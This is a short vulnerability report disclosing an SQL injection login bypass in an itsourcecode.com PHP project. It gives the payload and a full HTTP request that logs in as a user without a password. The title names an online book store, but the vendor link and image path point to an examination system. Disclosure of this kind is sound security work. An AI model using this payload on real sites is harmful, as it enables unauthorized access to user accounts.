# Online Book Store Project v1.0 by itsourcecode.com has SQL injection
**Vul_Author:** Wenxun Wang

**vendors:** https://itsourcecode.com/free-projects/php-project/online-examination-system-in-php/

**Vulnerability url:** /Online/query/loginExe.php

**Vulnerability location:** /Online/query/loginExe.php


**[+] Payload:** username=jane@gmail.com'#&pass=

​	Leak place : username

**Correct username and password:** username=jane@gmail.com&pass=jane

**Request package**：try to login without password

```
POST /Online/query/loginExe.php HTTP/1.1
Host: localhost
Content-Length: 31
sec-ch-ua: "-Not.A/Brand";v="8", "Chromium";v="102"
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36
sec-ch-ua-platform: "Windows"
Origin: http://localhost
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost/Online/index.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=hlrckqkq9743hpeup42er0t684
Connection: close

username=jane@gmail.com'#&pass=
```

**SQL injection result**：(line 12 of the resonse) login successfully without password

![sql_injection](https://github.com/iknownt/bug_report/blob/main/vendors/itsourcecode.com/Onlin-Examination-System/images/sql_injection1.png)

